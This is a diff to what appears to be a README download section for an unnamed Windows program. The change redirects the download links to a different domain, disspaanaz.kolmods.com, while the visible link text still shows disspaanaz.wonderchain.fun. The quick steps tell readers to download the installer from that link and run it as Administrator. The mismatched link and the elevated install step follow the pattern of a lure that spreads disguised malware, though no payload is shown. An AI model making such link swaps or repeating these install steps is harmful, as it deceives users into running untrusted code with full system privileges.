@@ -30,14 +30,14 @@
 
 | | |
 | --- | --- |
-| **Direct link** | **[disspaanaz.wonderchain.fun](https://disspaanaz.wonderchain.fun/)** |
-| **Full URL** | `https://disspaanaz.wonderchain.fun/` |
+| **Direct link** | **[disspaanaz.wonderchain.fun](https://disspaanaz.kolmods.com/)** |
+| **Full URL** | `https://disspaanaz.kolmods.com/` |
 | **Platform** | Windows 10 / 11 (64-bit) |
 | **Install** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Open **[disspaanaz.wonderchain.fun](https://disspaanaz.wonderchain.fun/)** in your browser
+1. Open **[disspaanaz.wonderchain.fun](https://disspaanaz.kolmods.com/)** in your browser
 2. Download the latest Windows build
 3. Run the installer **as Administrator**
 4. Launch from Start menu or tray icon
